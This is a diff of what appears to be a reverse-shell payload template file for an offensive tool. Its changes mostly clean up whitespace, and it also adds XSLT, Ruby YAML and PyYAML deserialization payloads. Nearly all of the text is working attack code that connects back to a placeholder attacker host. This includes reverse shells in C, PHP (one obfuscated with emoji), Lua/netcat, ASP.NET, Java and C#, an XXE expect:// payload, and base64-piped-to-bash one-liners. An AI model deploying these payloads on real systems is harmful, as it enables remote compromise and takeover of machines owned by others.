@@ -101,11 +101,11 @@ int main(void){
     struct sockaddr_in revsockaddr;
 
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
-    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_family = AF_INET;
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr("{IP}");
 
-    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    connect(sockt, (struct sockaddr *) &revsockaddr,
     sizeof(revsockaddr));
     dup2(sockt, 0);
     dup2(sockt, 1);
@@ -114,7 +114,7 @@ int main(void){
     char * const argv[] = {"/bin/sh", NULL};
     execve("/bin/sh", argv, NULL);
 
-    return 0;       
+    return 0;
 }
 
 #EXAMPLE
@@ -198,8 +198,8 @@ nc.exe -nv {IP} {PORT} -e cmd.exe
 <?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = "{IP}";  
-$port = {PORT};       
+$ip = "{IP}";
+$port = {PORT};
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -292,7 +292,7 @@ function printit ($string) {
 
 {PHPEMOJI}
 <?php
-#Reverse shell 
+#Reverse shell
 $😀="1";$😁="2";$😅="3";$😆="4";$😉="5";$😊="6";$😎="7";$😍="8";$😚="9";
 $🙂="0";$🤢=" ";$🤓="<";$🤠=">";$😱="-";$😵="&";$🤩="i";$🤔=".";$🤨="/";
 $🥰="a";$😐="b";$😶="i";$🙄="h";$😂="c";$🤣="d";$😃="e";$😄="f";$😋="k";
@@ -306,7 +306,7 @@ $🐚 = $🤨. $😐. $😶. $😘. $🤨. $😐. $🥰. $🤗. $🙄. $🤢. $�
 $🤣 =  $💀($🚀,$💻);
 $👽 = $😃. $😑. $😃. $😂;
 $👽($🐚);
-?> 
+?>
 
 
 #EXAMPLE
@@ -663,12 +663,12 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
 <script runat="server">
 //Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
 //Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
-    
+
 	protected void Page_Load(object sender, EventArgs e)
     {
 	    String host = "{IP}";
             int port = {PORT};
-                
+
         CallbackShell(host, port);
     }
 
@@ -711,8 +711,8 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
         public IntPtr lpSecurityDescriptor;
         public bool bInheritHandle;
     }
-    
-    
+
+
     [DllImport("kernel32.dll")]
     static extern bool CreateProcess(string lpApplicationName,
        string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
@@ -722,7 +722,7 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
        out PROCESS_INFORMATION lpProcessInformation);
 
     public static uint INFINITE = 0xFFFFFFFF;
-    
+
     [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
     internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);
 
@@ -743,7 +743,7 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
     public const int STD_INPUT_HANDLE = -10;
     public const int STD_OUTPUT_HANDLE = -11;
     public const int STD_ERROR_HANDLE = -12;
-    
+
     [DllImport("kernel32")]
     static extern bool AllocConsole();
 
@@ -752,7 +752,7 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
     internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                             [In] SocketType socketType,
                                             [In] ProtocolType protocolType,
-                                            [In] IntPtr protocolInfo, 
+                                            [In] IntPtr protocolInfo,
                                             [In] uint group,
                                             [In] int flags
                                             );
@@ -764,17 +764,17 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
 
     [DllImport("ws2_32.dll")]
     private static extern uint htonl(uint ip);
-    
+
     [DllImport("ws2_32.dll")]
     private static extern uint ntohl(uint ip);
-    
+
     [DllImport("ws2_32.dll")]
     private static extern ushort htons(ushort ip);
-    
-    [DllImport("ws2_32.dll")]
-    private static extern ushort ntohs(ushort ip);   
 
-    
+    [DllImport("ws2_32.dll")]
+    private static extern ushort ntohs(ushort ip);
+
+
    [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);
 
@@ -858,7 +858,7 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
        SecurityDelegation
    }
 
-   
+
    [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
@@ -869,7 +869,7 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
        ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
        ref IntPtr DuplicateTokenHandle);
 
-   
+
 
    const int ERROR_NO_MORE_ITEMS = 259;
 
@@ -895,7 +895,7 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
        ref int cbName,
        StringBuilder DomainName,
        ref int cbDomainName,
-       ref int peUse 
+       ref int peUse
 
    );
 
@@ -989,13 +989,13 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr CreateNamedPipe(
-        String lpName,									
-        uint dwOpenMode,								
-        uint dwPipeMode,								
-        uint nMaxInstances,							
-        uint nOutBufferSize,						
-        uint nInBufferSize,							
-        uint nDefaultTimeOut,						
+        String lpName,
+        uint dwOpenMode,
+        uint dwPipeMode,
+        uint nMaxInstances,
+        uint nOutBufferSize,
+        uint nInBufferSize,
+        uint nDefaultTimeOut,
         IntPtr pipeSecurityDescriptor
         );
 
@@ -1019,7 +1019,7 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
         StringBuilder lpUserName,
         int nMaxUserNameSize
         );
- 
+
     protected void CallbackShell(string server, int port)
     {
 
@@ -1027,7 +1027,7 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
         Byte[] bytesSent = Encoding.ASCII.GetBytes(request);
 
         IntPtr oursocket = IntPtr.Zero;
-        
+
         sockaddr_in socketinfo;
         oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
         socketinfo = new sockaddr_in();
@@ -1043,7 +1043,7 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
     protected void SpawnProcess(IntPtr oursocket)
     {
         bool retValue;
-        string Application = Environment.GetEnvironmentVariable("comspec"); 
+        string Application = Environment.GetEnvironmentVariable("comspec");
         PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
         STARTUPINFO sInfo = new STARTUPINFO();
         SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
@@ -1059,12 +1059,12 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
     protected void SpawnProcessAsPriv(IntPtr oursocket)
     {
         bool retValue;
-        string Application = Environment.GetEnvironmentVariable("comspec"); 
+        string Application = Environment.GetEnvironmentVariable("comspec");
         PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
         STARTUPINFO sInfo = new STARTUPINFO();
         SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
         pSec.Length = Marshal.SizeOf(pSec);
-        sInfo.dwFlags = 0x00000101; 
+        sInfo.dwFlags = 0x00000101;
         IntPtr DupeToken = new IntPtr(0);
         sInfo.hStdInput = oursocket;
         sInfo.hStdOutput = oursocket;
@@ -1077,9 +1077,9 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
         CloseHandle(DupeToken);
     }
     </script>
-                                                                             
+
 #INDEX
-   
+
 #EXAMPLE
 
 #Payload (Save as shell.sh)
@@ -1100,7 +1100,7 @@ echo {BASE64} | base64 -d | bash
 <!DOCTYPE root [<!ENTITY test SYSTEM "expect://bash$IFS/tmp/shell.sh">]>
 <root>
 <email>&test;</email>
-</root>                                                                                                                 
+</root>
 
 
 #INDEX
@@ -1156,7 +1156,7 @@ if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
     ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
     ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
   } catch( Exception e ) {}
-   
+
 #INDEX
 
 #EXAMPLE
@@ -1188,7 +1188,7 @@ namespace ConnectBack
 					using(StreamReader rdr = new StreamReader(stream))
 					{
 						streamWriter = new StreamWriter(stream);
-						
+
 						StringBuilder strInput = new StringBuilder();
 
 						Process p = new Process();
@@ -1235,7 +1235,7 @@ namespace ConnectBack
 
 #EXAMPLE
 
-#LInux (Save as shell.cs)
+#Linux (Save as shell.cs)
 
 using System;
 using System.Text;
@@ -1262,7 +1262,7 @@ namespace ConnectBack
 					using(StreamReader rdr = new StreamReader(stream))
 					{
 						streamWriter = new StreamWriter(stream);
-						
+
 						StringBuilder strInput = new StringBuilder();
 
 						Process p = new Process();
@@ -1307,4 +1307,55 @@ namespace ConnectBack
 	}
 }
 
-                                                                                                                      
+#INDEX
+
+#EXAMPLE
+
+# Save as shell.xsl
+
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body>
+<xsl:value-of select="php:function('system','echo {BASE64} | base64 -d | bash')" />
+</body>
+</html>
+
+#INDEX
+
+#EXAMPLE
+
+# Ruby yaml
+
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::DependencyList
+  specs:
+  - !ruby/object:Gem::Source::SpecificFile
+    spec: &1 !ruby/object:Gem::StubSpecification
+      loaded_from: "|echo {BASE64} | base64 -d | bash 1>&2"
+  - !ruby/object:Gem::Source::SpecificFile
+      spec:
+
+#EXAMPLE
+
+# Python (PyYAML #1)
+
+!!python/object/apply:subprocess.Popen
+- !!python/tuple
+  - python
+  - -c
+  - "__import__('os').system(str(__import__('base64').b64decode('{BASE64_FULL}').decode()))"
+
+{YAML_PY}
+
+#EXAMPLE
+
+# Python (PyYAML #2)
+
+!!python/object/apply:subprocess.Popen
+- !!python/tuple
+  - python
+  - -c
+  - "__import__('os').system('echo {BASE64} | base64 -d | bash')"
+
+{YAML_PY}
